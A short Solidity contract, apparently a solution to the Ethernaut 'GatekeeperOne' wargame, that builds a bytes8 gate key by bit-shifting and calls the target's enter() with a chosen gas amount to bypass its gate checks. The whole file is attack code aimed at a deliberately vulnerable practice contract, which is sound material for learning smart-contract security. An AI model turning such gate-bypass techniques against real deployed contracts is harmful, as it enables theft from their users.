pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract FixedGasAttacker {
    IGatekeeperOne gatekeeper;

    constructor(address _instance) {
        gatekeeper = IGatekeeperOne(_instance);
    }

    function attack() external {
        bytes8 gateKey = 0x0000000000002266;
        uint64 upperBits = 0x00000001;
        bytes8 fullGateKey = bytes8(((uint64(upperBits)) << 32) | uint64(gateKey));
        gatekeeper.enter{gas: 8191 * 3 + 3}(fullGateKey);
    }
}
